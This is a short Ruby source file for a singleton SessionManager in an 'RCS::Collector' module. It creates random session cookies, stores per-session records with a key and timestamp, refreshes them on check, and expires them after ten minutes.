#
#  Session Manager, manages all the cookies
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'singleton'
require 'securerandom'

module RCS
module Collector

class SessionManager
  include Singleton
  include RCS::Tracer

  def initialize
    @sessions = {}
  end

  def create(bid, build, instance, subtype, k)

    # create a new random cookie
    cookie = SecureRandom.random_bytes(8).unpack('H*').first

    # store the sessions
    @sessions[cookie] = {:bid => bid,
                         :build => build,
                         :instance => instance,
                         :subtype => subtype,
                         :key => k,
                         :cookie => cookie,
                         :time => Time.now}

    return cookie
  end

  def check(cookie)
    return false if @sessions[cookie].nil?

    # update the time of the session (to avoid timeout)
    @sessions[cookie][:time] = Time.now

    return true
  end

  def get(cookie)
    return @sessions[cookie]
  end

  def delete(cookie)
    @sessions.delete(cookie)
  end

  def timeout
    trace :debug, "Session Manager timeouting entries..."
    @sessions.delete_if { |key, value| Time.now - value[:time] >= 600 }
  end

end #SessionManager

end #Collector::
end #RCS::